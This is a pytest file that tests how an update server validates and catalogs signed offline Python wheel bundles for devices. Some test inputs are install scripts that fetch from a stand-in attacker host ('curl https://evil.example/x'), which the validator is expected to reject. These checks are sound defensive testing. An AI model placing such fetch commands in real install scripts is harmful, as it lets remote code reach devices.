"""Behavioral tests for the Python wheel-bundle artifact validation and
cataloging path: _validate_python_bundle_commands(), _validate_python_bundle_
file_policy(), catalog_python_update_artifact(), and bind_artifact_to_update()'s
dependency-artifact type guard.
"""
import json

import pytest
from fastapi import HTTPException

import main
from database import Base, DeviceInventory, PendingUpdate, SessionLocal, UpdateArtifact, engine


class _FakeUser:
    def __init__(self, username="tester", role="admin"):
        self.username = username
        self.role = role


DEVICE_ID = "TL-TESTDEVICE-PYARTIFACT"


def _clean(session):
    session.query(UpdateArtifact).filter(UpdateArtifact.artifact_id.like("TL-PY-%")).delete(synchronize_session=False)
    session.query(PendingUpdate).filter_by(scope_id=DEVICE_ID).delete()
    session.commit()


# ── _validate_python_bundle_commands() ──────────────────────────────────────

def test_validate_commands_accepts_default_bash_script_invocation():
    main._validate_python_bundle_commands(main._default_python_bundle_commands())


def test_validate_commands_rejects_non_allowlisted_executable():
    with pytest.raises(HTTPException):
        main._validate_python_bundle_commands([
            {"name": "sneaky", "argv": ["/usr/bin/curl", "{bundle}/x"], "timeout_s": 60}
        ])


def test_validate_commands_rejects_pip_with_index_url():
    with pytest.raises(HTTPException):
        main._validate_python_bundle_commands([
            {"name": "bad", "argv": ["/usr/bin/pip3", "install", "--index-url", "https://pypi.org/simple", "{bundle}/x"], "timeout_s": 60}
        ])


def test_validate_commands_rejects_pip_without_no_index():
    with pytest.raises(HTTPException):
        main._validate_python_bundle_commands([
            {"name": "bad", "argv": ["/usr/bin/pip3", "install", "requests", "{bundle}/x"], "timeout_s": 60}
        ])


def test_validate_commands_requires_bundle_placeholder():
    with pytest.raises(HTTPException):
        main._validate_python_bundle_commands([
            {"name": "bad", "argv": ["/bin/bash", "/absolute/path.sh"], "timeout_s": 60}
        ])


# ── _validate_python_bundle_file_policy() ───────────────────────────────────

def test_file_policy_rejects_curl_in_script(tmp_path):
    (tmp_path / "install-offline.sh").write_text("#!/bin/bash\ncurl https://evil.example/x\n")
    with pytest.raises(HTTPException):
        main._validate_python_bundle_file_policy(tmp_path, [{"path": "install-offline.sh"}])


def test_file_policy_rejects_pip_install_missing_no_index(tmp_path):
    (tmp_path / "install-offline.sh").write_text("#!/bin/bash\npip3 install requests\n")
    with pytest.raises(HTTPException):
        main._validate_python_bundle_file_policy(tmp_path, [{"path": "install-offline.sh"}])


def test_file_policy_accepts_offline_pip_install(tmp_path):
    (tmp_path / "install-offline.sh").write_text(
        "#!/bin/bash\n/opt/timelapse/venv/bin/python3 -m pip install --no-index --find-links=packages 'requests==2.31.0'\n"
    )
    main._validate_python_bundle_file_policy(tmp_path, [{"path": "install-offline.sh"}])


# ── catalog_python_update_artifact() ────────────────────────────────────────

def _write_fake_bundle(root):
    (root / "packages").mkdir(parents=True)
    (root / "packages" / "requests-2.31.0-py3-none-any.whl").write_bytes(b"fake wheel bytes")
    (root / "package-manifest.json").write_text(json.dumps({"schema": "timelapse.python_package_manifest.v1"}))
    (root / "verify-installed.sh").write_text(
        "#!/bin/bash\nactual=$(/opt/timelapse/venv/bin/python3 -m pip show requests | awk -F': ' '/^Version:/ {print $2}')\ntest \"$actual\" = '2.31.0'\n"
    )


def test_catalog_python_artifact_requires_whl_files(tmp_path):
    Base.metadata.create_all(bind=engine)
    (tmp_path / "package-manifest.json").write_text("{}")
    (tmp_path / "verify-installed.sh").write_text("#!/bin/bash\n")
    session = SessionLocal()
    try:
        with pytest.raises(HTTPException):
            main.catalog_python_update_artifact({"storage_path": str(tmp_path), "version": "test-1"}, _FakeUser(), session)
    finally:
        session.close()


def test_catalog_python_artifact_registers_signed_dependency_artifact(tmp_path):
    Base.metadata.create_all(bind=engine)
    session = SessionLocal()
    _clean(session)
    try:
        _write_fake_bundle(tmp_path)
        result = main.catalog_python_update_artifact(
            {"storage_path": str(tmp_path), "version": "test-py-1", "python_version": "3.10.12", "architecture": "arm64"},
            _FakeUser(),
            session,
        )
        assert result["artifact_id"].startswith("TL-PY-")
        artifact = session.query(UpdateArtifact).filter_by(artifact_id=result["artifact_id"]).first()
        assert artifact.artifact_type == "dependency"
        assert artifact.signature
        manifest = json.loads(artifact.manifest_json)
        assert manifest["schema"] == "timelapse.python_update_artifact.v1"
        assert manifest["distribution_model"] == "headend_signed_offline_python_bundle_edge_pull"
        assert any(o["path"].endswith(".whl") for o in manifest["outputs"])
    finally:
        cleanup = SessionLocal()
        _clean(cleanup)
        cleanup.close()


def test_catalog_python_artifact_rejects_forbidden_script_content(tmp_path):
    Base.metadata.create_all(bind=engine)
    _write_fake_bundle(tmp_path)
    (tmp_path / "verify-installed.sh").write_text("#!/bin/bash\ncurl https://evil.example/x\n")
    session = SessionLocal()
    try:
        with pytest.raises(HTTPException):
            main.catalog_python_update_artifact({"storage_path": str(tmp_path), "version": "test-2"}, _FakeUser(), session)
    finally:
        session.close()


# ── bind_artifact_to_update() type guard ────────────────────────────────────
#
# is_deployable_artifact() requires a real PGP signature (services/artifact_trust.py);
# without a configured signing key, _sign_payload() falls back to a "system-hash"
# marker that is deliberately never deployable. Mock a valid-shaped signature so
# these tests exercise the NEW dependency-artifact type guard itself, not the
# (already-covered-elsewhere) signing gate.

def _force_deployable_signature(monkeypatch):
    monkeypatch.setattr(main, "_sign_payload", lambda payload: ("-----BEGIN PGP SIGNATURE-----\nfake\n-----END PGP SIGNATURE-----", "test-signer"))


def test_bind_rejects_dependency_artifact_on_non_dependency_update(tmp_path, monkeypatch):
    Base.metadata.create_all(bind=engine)
    session = SessionLocal()
    _clean(session)
    try:
        _force_deployable_signature(monkeypatch)
        _write_fake_bundle(tmp_path)
        artifact_dict = main.catalog_python_update_artifact(
            {"storage_path": str(tmp_path), "version": "test-py-guard"}, _FakeUser(), session,
        )
        update = PendingUpdate(
            update_type="app_updates", status="approved", scope="device",
            scope_id=DEVICE_ID, version="1.0",
        )
        session.add(update)
        session.commit()
        with pytest.raises(HTTPException) as excinfo:
            main.bind_artifact_to_update(update.id, {"artifact_id": artifact_dict["artifact_id"]}, _FakeUser(), session)
        assert "dependency" in excinfo.value.detail.lower()
    finally:
        cleanup = SessionLocal()
        _clean(cleanup)
        cleanup.close()


def test_bind_accepts_dependency_artifact_on_dependency_update(tmp_path, monkeypatch):
    Base.metadata.create_all(bind=engine)
    session = SessionLocal()
    _clean(session)
    try:
        _force_deployable_signature(monkeypatch)
        _write_fake_bundle(tmp_path)
        artifact_dict = main.catalog_python_update_artifact(
            {"storage_path": str(tmp_path), "version": "test-py-guard-ok"}, _FakeUser(), session,
        )
        update = PendingUpdate(
            update_type="dependency_updates", status="blocked", scope="device",
            scope_id=DEVICE_ID, version="1 pakker",
        )
        session.add(update)
        session.commit()
        main.bind_artifact_to_update(update.id, {"artifact_id": artifact_dict["artifact_id"]}, _FakeUser(), session)
    finally:
        cleanup = SessionLocal()
        _clean(cleanup)
        cleanup.close()
